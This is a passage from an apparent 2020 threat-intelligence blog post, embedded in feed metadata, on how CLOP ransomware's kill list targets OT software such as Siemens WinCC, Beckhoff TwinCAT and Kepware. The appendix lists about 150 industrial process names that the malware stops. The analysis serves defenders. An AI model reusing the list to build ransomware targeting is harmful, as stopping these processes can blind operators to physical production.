over 1,425 processes, from which at least 150 belong to OT-related software suites (Figure 2 and Appendix).</p> \n<p>Based on our analysis, the CLOP malware family’s process kill list has grown over time possibly as more processes are scanned during different compromises. While we do not currently hold enough information to describe the exact mechanism used by the actor to grow the list, it appears to have resulted from actor reconnaissance across multiple victims. We have observed the threat actor employing process discovery procedures, including running the tasklist utility. This indicates that the actor scanned for processes in at least one victim’s OT network(s) before deploying the ransomware.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure&nbsp;2:&nbsp;Subset of processes&nbsp;in observed CLOP sample</span></p> \n<p>CLOP is also interesting as we have only observed a single unique and very prolific financially motivated threat actor leveraging the malware family. The group, who has been active since at least 2016 and potentially as early as 2014, is known for operating large phishing campaigns to distribute malware and typically monetizes intrusions through ransomware deployment. As highlighted by their versatility and long history in financially motivated intrusions, the actor’s activity in OT networks is likely no more than an additional step in the process for monetization. However, the financial motivations of the actor again do not imply low risk to OT. Instead, our analysis of the CLOP sample’s kill list indicates that the included processes actually have greater potential to disrupt OT systems than those included in the shared list described above.</p> \n<p>Unlike the first kill list, the CLOP sample includes a list of processes that, if stopped, may directly impact the operator’s ability to both visualize and control production. This is especially true in the case of some included processes that support HMI and PLC supervision. Some of the OT processes present in the CLOP sample are related to the following products:</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"121\"><p> <b>Vendor</b></p> </td> \n   <td width=\"119\"><p> <b>Product</b></p> </td> \n   <td width=\"383\"><p> <b>Description</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"121\"><p>Siemens</p> </td> \n   <td width=\"119\"><p>SIMATIC WinCC</p> </td> \n   <td width=\"383\"><p>SCADA system, common for process control and automation.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"121\"><p>Beckhoff</p> </td> \n   <td width=\"119\"><p>TwinCAT</p> </td> \n   <td width=\"383\"><p>Software for PC-based process&nbsp;control and automation.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"0\"><p>National Instruments</p> </td> \n   <td width=\"0\"><p>Data Acquisition Software (DAQ)</p> </td> \n   <td width=\"0\"><p>Software used to acquire data from&nbsp;sensors&nbsp;and conditioning devices.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"121\"><p>Kepware</p> </td> \n   <td width=\"119\"><p>KEPServer EX</p> </td> \n   <td width=\"383\"><p>Software platform that collects information from industrial devices and sends the output to SCADA applications.</p> </td> \n  </tr> \n  <tr> \n   <td width=\"121\"><p>OPC Unified Architecture (OPC-UA)</p> </td> \n   <td width=\"119\"><p>N/A</p> </td> \n   <td width=\"383\"><p>Communication protocol for&nbsp;data&nbsp;acquisition&nbsp;and exchange between industrial equipment and enterprise systems.&nbsp;</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 1: Examples of products related to OT processes included in identified CLOP kill list</span></p> \n<p>While it is likely the physical processes this software controls would continue to operate even if the software processes were terminated unexpectedly, stopping the software processes included in the CLOP sample’s kill list could result in the loss of view/control over those physical processes due to the inability of operators to interact with the equipment. This can be caused not only by the ransomware’s disruption of intermediary systems, but also by the loss of access to relevant files on HMIs/EWS required for the operation of process control and monitoring software–for example configurations or project files. This could prolong the mean time to recovery (MTTR) of impacted environments without offline backups. In the CLOP sample list, we also identified specialized processes for software application design and testing that may also become corrupted at the time of encryption.</p> \n<h4>Process Kill Lists Are Just An Observable Indicating Broader Financially Motivated Interest In OT</h4> \n<p>Financially motivated threat actors leverage a large variety of tactics and techniques to obtain data that they can later use to generate profits. While financial actors have historically posed little to no threat to OT systems, the recent uptick in ransomware and extortion incidents highlights that industrial operations are increasingly at risk. Although we have not observed any financially motivated actors explicitly targeting OT systems, our research into process kill lists deployed with or alongside ransomware samples shows that at least two sophisticated financial actors have expanded their access into OT networks during their regular intrusions.</p> \n<p>This increasing exposure of OT to financially motivated threat activity is no surprise, given that TTPs used by cybercriminals increasingly resemble those employed by sophisticated actors. We have consistently conveyed this message since at least 2018, when we publicly discussed the commodity and <a href=\"https://www.fireeye.com/blog/threat-research/2019/04/triton-actor-ttp-profile-custom-attack-tools-detections.html\">custom IT tools leveraged by the TRITON attacker</a> while traversing through its targets’ networks (Figure 3). The likelihood of financially motivated actors impacting OT while seeking to monetize intrusions will continue to rise for the following reasons:</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: TTPs seen across both IT and OT incidents</span></p> \n<ul> \n <li>Financially-motivated threat actors moving to a post-compromise ransomware model will continue to evolve and find ways to reach the most critical systems of organizations as part of their mission of monetization. As these actors are mainly driven by profits, they are not likely to differentiate between IT and OT assets.</li> \n <li>OT organizations will continue to struggle to evolve at the same pace as cyber criminals. As a result, small weaknesses such as misconfigurations, exposed vulnerabilities or improper segmentation will be enough for financial actors to gain access to networks in their attempts to profit from intrusions.</li> \n <li>As the market for OT solutions continues to incorporate IT services and features into broadly adopted products, we expect the convergence of technologies to result in a broader attack surface for financial threat actors to target.</li> \n <li>The TTPs employed by both financial and sophisticated nation-state actors often rely on intermediary systems as stepping stones through intrusions. As a result, the skills of both groups hold similar potential of reaching OT systems even when financial groups may only do so coincidentally or as part of their monetization strategy.</li> \n</ul> \n<h4>Outlook</h4> \n<p>As OT networks continue to become more accessible to threat actors of all motivations, security threats that have historically impacted primarily IT are becoming more commonplace. This normalization of OT as just another network from the threat actor perspective is problematic for defenders for many of the reasons discussed above. This recent threat activity should be taken as a wake-up call for two main reasons: the various security challenges commonly faced by organizations to protect OT networks, and the significant consequences that may arise from security compromises even when they are not explicitly designed to target production systems. Asset owners need to look at OT security with the mindset that it is not if you will have a breach, but when. This shift in thinking will allow defenders to better prepare to respond when an incident does happen, and can help reduce the impact of an incident by orders of magnitude.&nbsp; &nbsp;</p> \n<h4>Appendix: Selection Of OT Processes From CLOP Kill List</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"665\"> \n <tbody> \n  <tr> \n   <td width=\"462\"><p> <b>Process Name</b></p> </td> \n   <td width=\"203\"><p> <b>Vendor</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ACTLICENSESERVER.EXE</p> </td> \n   <td width=\"203\"><p>Atlas Copco</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TCATSYSSRV.EXE</p> </td> \n   <td width=\"203\"><p>Beckhoff</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TCEVENTLOGGER.EXE</p> </td> \n   <td width=\"203\"><p>Beckhoff</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TCR.EXE</p> </td> \n   <td width=\"203\"><p>Beckhoff</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ALARMMANAGER.EXE</p> </td> \n   <td width=\"203\"><p>GE</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S2.EXE</p> </td> \n   <td width=\"203\"><p>Honeywell</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BR.ADI.DISPLAY.BRIGHTNESS.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BR.ADI.SERVICE.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BR.ADI.UPS.MANAGER.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BR.ADI.UPS.SERVICE.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BR.AS.UPGRADESERVICE.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BRAUTHORIZATIONSVC.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>BRTOUCHSVC.EXE</p> </td> \n   <td width=\"203\"><p>B&amp;R</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>OPCROUTER4SERVICE.EXE</p> </td> \n   <td width=\"203\"><p>Inray Industriesoftware</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>OPCROUTERCONFIG.EXE</p> </td> \n   <td width=\"203\"><p>Inray Industriesoftware</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SERVER_EVENTLOG.EXE</p> </td> \n   <td width=\"203\"><p>Kepware</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SERVER_RUNTIME.EXE</p> </td> \n   <td width=\"203\"><p>Kepware</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NICELABELAUTOMATIONSERVICE2017.EXE</p> </td> \n   <td width=\"203\"><p>NiceLabel</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NICELABELPROXY.EXE</p> </td> \n   <td width=\"203\"><p>NiceLabel</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NICELABELPROXYSERVICE2017.EXE</p> </td> \n   <td width=\"203\"><p>NiceLabel</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>APPLICATIONWEBSERVER.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CWDSS.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIAUTH_DAEMON.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIDEVMON.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIDISCSVC.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIDMSRV.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIERSERVER.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NILXIDISCOVERY.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIMDNSRESPONDER.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIMXS.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIPXICMS.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIROCO.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NISDS.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NISVCLOC.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>NIWEBSERVICECONTAINER.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SYSTEMWEBSERVER.EXE</p> </td> \n   <td width=\"203\"><p>National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>OPC.UA.DISCOVERYSERVER.EXE</p> </td> \n   <td width=\"203\"><p>OPC</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>OPCUALDS.EXE</p> </td> \n   <td width=\"203\"><p>OPC</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANAWIN.EXE</p> </td> \n   <td width=\"203\"><p>AUTEM</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ASM.EXE</p> </td> \n   <td width=\"203\"><p>Possibly Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>PARAMETRIC.EXE</p> </td> \n   <td width=\"203\"><p>PTC</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>QDAS_O-QIS.EXE</p> </td> \n   <td width=\"203\"><p>Q-Das</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>QDAS_PROCELLA.EXE</p> </td> \n   <td width=\"203\"><p>Q-Das</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>QDAS_QS-STAT.EXE</p> </td> \n   <td width=\"203\"><p>Q-Das</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>QDASIDI_SRV.EXE</p> </td> \n   <td width=\"203\"><p>Q-Das</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SPCPROCESSLINK.EXE</p> </td> \n   <td width=\"203\"><p>Q-Das</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TAGSRV.EXE</p> </td> \n   <td width=\"203\"><p>Rockwell Automation or National Instruments</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>_SIMPCMON.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ALMPANELPLUGIN.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ALMSRV64X.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ALMSRVBUBBLE64X.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CC.TUNNELSERVICEHOST.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCAEPROVIDER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCAGENT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCALGRTSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCARCHIVEMANAGER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCCAPHSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCCSIGRTSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCDBUTILS.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCDELTALOADER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCDMRUNTIMEPERSISTENCE.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCECLIENT_X64.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCECLIENT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCESERVER_X64.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCESERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCKEYBOARDHOOK.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCLICENSESERVICE.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCNSINFO2PROVIDER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCPACKAGEMGR.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCPERFMON.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCPROFILESERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCPROJECTMGR.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCPTMRTSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCREDUNDANCYAGENT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCREMOTESERVICE.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCRT2XML.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCRTSLOADER_X64.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCSSMRTSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCSYSTEMDIAGNOSTICSHOST.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCTEXTSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCTLGSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCTMTIMESYNC.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCTMTIMESYNCSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCUCSURROGATE.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCWATCHOPC.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCWRITEARCHIVESERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>DA2XML.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>GSCRT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>HMIES.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>HMIRTM.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>HMISMARTSTART.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>HMRT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>IPCSECCOM.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>OPCUASERVERWINCC.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>PASSDBRT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>PDLRT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>PMEXP.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>PNIOMGR.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>REDUNDANCYCONTROL.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>REDUNDANCYSTATE.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7ACMGRX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7AHHLPX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7ASYSVX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7EPASRV64X.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7HSPSVX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7KAFAPX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7O.TUNNELSERVICEHOST.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7OIEHSX64.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7OPNDISCOVERYX64.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7SYMAPX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7TGTOPX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7TRACESERVICE64X.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7UBTOOX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7UBTSTX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7WNRMSX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7WNSMGX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7WNSMSX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7XUDIAX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>S7XUTAPX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCORECFG.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCOREDP.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCOREPNIO.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCORES7.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCORESR.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCSDISTSERVICEX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCSFSX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SCSMX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SDIAGRT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SIEMENS.INFORMATIONSERVER.DISCOVERSERVICEINSTALLER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SIEMENS.INFORMATIONSERVER.ISREADY.PLUGINSERVICE.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SIEMENS.INFORMATIONSERVER.SCHEDULER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SIM9SYNC.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SIMNETPNPMAN.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SMARTSERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>SSERVCFG.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TOUCHINPUTPC.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TRACECONCEPTX.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>TRACESERVER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>UM.RIS.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>UM.SSO.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>WEBNAVIGATORRT.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>WINCCEXPLORER.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CCDMRTCHANNELHOST.EXE</p> </td> \n   <td width=\"203\"><p>Siemens</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYS.ACT.BROWSER.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYS.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYS192.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYSFWW.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYSLI_CLIENT.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYSLI_MONITOR.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYSLI_SERVER.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYSLMD.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ANSYSWBU.EXE</p> </td> \n   <td width=\"203\"><p>Ansys</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>CONFIGSERVERI64.EXE</p> </td> \n   <td width=\"203\"><p>Tani</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>ENGINELOGGERI64.EXE</p> </td> \n   <td width=\"203\"><p>Tani</p> </td> \n  </tr> \n  <tr> \n   <td width=\"462\"><p>PLCENGINEI64.EXE</p> </td> \n   <td width=\"203\"><p>Tani</p> </td> \n  </tr>\n </tbody>\n</table>","descriptionType":"html","publishedDate":"Wed, 15 Jul 2020 15:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture1.png","linkMd5":"941ebf207a443bddd6975ca5cd94ff73","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn52@2020_1/2020/08/24/14-11-05-351_7ac2173db94e4060.webp","destWidth":1538,"destHeight":926,"sourceBytes":698275,"destBytes":133064,"author":"Nathan 